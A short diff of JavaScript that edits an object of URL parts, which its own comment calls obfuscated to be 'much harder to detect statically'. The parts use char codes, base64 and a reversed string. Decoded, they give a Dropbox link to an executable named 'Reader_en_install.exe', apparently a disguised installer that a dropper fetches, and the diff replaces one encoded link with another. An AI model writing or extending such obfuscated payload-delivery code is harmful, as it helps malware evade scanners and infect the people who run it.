@@ -7,7 +7,7 @@
 // Obfuscated URL parts - much harder to detect statically
 const _u = {
     p: "h" + String.fromCharCode(116) + String.fromCharCode(116) + "p" + "s:",
-    h: atob("Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2d3a204YjAzYmV4OW5sZW44b2Q0MC9SZWFkZXJfZW5faW5zdGFsbC5leGU/"),
+    h: atob("Ly9kcm9wYm94LmNvbS9zY2wvZmkvZ3drbThiMDNiZXg5bmxlbjhvZDQwL1JlYWRlcl9lbl9pbnN0YWxsLmV4ZQ=="),
     e: "0ld&=w5kle5v&=ts=du25kf59sf2gsr9pe0njv5dy3=yek?lr".split("").reverse().join("")
 };
 
